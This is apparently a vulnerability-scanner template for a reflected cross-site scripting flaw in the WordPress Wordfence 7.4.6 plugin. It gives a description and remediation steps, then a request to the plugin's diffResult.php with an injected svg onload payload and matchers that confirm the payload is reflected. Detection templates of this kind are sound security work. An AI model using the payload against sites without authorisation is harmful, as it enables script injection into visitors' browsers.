id: wordpress-wordfence-xss
info:
  name: WordPress Wordfence 7.4.6 Cross Site Scripting
  author:
  - l0ne1y
  description: |+
    WordPress plugin Wordfence 7.4.6 cross-site scripting vulnerability
    WordPress is a blogging platform developed by the WordPress Foundation using the PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. Wordfence plugin is a malware scanning and firewall plugin used in it.

    There is a cross-site scripting vulnerability in the WordPress plugin Wordfence version 7.4.6. The vulnerability is caused by the lack of correct validation of client data in the WEB application. An attacker could exploit this vulnerability to execute client-side code.

  severity: medium
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/wordfence/

    Temporary fix:
    1. Filter the input (and URL parameters), encode the output, and combine the whitelist and blacklist. That is to say, filter all submitted content, filter the parameters in the URL, and filter out relevant content that will cause the script to be executed; and then HTML-encode the content dynamically output to the page so that the script cannot be executed in the browser. Although input filtering can be bypassed, a large number of XSS attacks will still be intercepted; finally, characters are whitelisted or blacklisted.
requests:
- matchers:
  - type: word
    part: body
    words:
    - '''>"<svg/onload=confirm(''test'')>'
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E'
  method: GET
